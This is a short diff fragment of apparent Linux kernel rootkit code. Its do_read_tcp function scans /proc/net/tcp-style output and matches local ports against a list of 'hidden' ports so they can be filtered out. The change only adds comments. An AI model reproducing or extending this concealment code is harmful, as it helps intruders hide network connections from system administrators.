@@ -256,8 +256,9 @@ static ssize_t do_read_tcp (struct file *fp, char __user *buf, size_t sz, loff_t
     while(i < read) {
         found = 0;
         lstart = &buf[i];
-        new_line = strchr(lstart, '\n');
-        ss = strchr(strchr(lstart, ':') + 1, ':') + 1;
+        new_line = strchr(lstart, '\n'); //pointer to new line.
+        ss = strchr(strchr(lstart, ':') + 1, ':') + 1; // pointer to first char after second colon
+        // ss Should be the local port
         // local_address
         for(j = 0; j < hidden_sport_count; ++j) {
             if(!strncmp(hidden_sports[j], ss, 4)) {
